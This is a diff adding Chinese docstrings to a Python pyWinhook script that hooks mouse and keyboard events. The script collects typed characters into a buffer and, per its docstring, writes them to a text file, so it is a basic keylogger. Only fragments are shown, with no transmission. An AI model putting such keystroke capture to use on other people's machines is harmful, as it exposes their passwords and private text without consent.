@@ -5,6 +5,14 @@ storage = ""
 
 # 监听到鼠标事件调用
 def onMouseEvent(event):
+    """
+
+    Args:
+        event: 鼠标事件
+
+    Returns:
+
+    """
     if event.MessageName != "mouse move":  # 因为鼠标一动就会有很多mouse move，所以把这个过滤下
         print(event.MessageName)
     return True  # 为True才会正常调用，如果为False的话，此次事件被拦截
@@ -12,6 +20,14 @@ def onMouseEvent(event):
 
 # 监听到键盘事件调用
 def onKeyboardEvent(event):
+    """
+
+    Args:
+        event: 键盘输入的事件
+
+    Returns:
+        若输出为False,则销毁事件
+    """
     global storage
     candi = str(event.Key)
     if candi.isdigit() or candi.isalpha() or candi.isspace():
@@ -28,6 +44,12 @@ def onKeyboardEvent(event):
 
 
 def main():
+    """
+
+    主函数，负责监视键盘的输入，并写入txt中
+    Returns:
+
+    """
     # 创建管理器
     hm = pyWinhook.HookManager()
     # 监听键盘
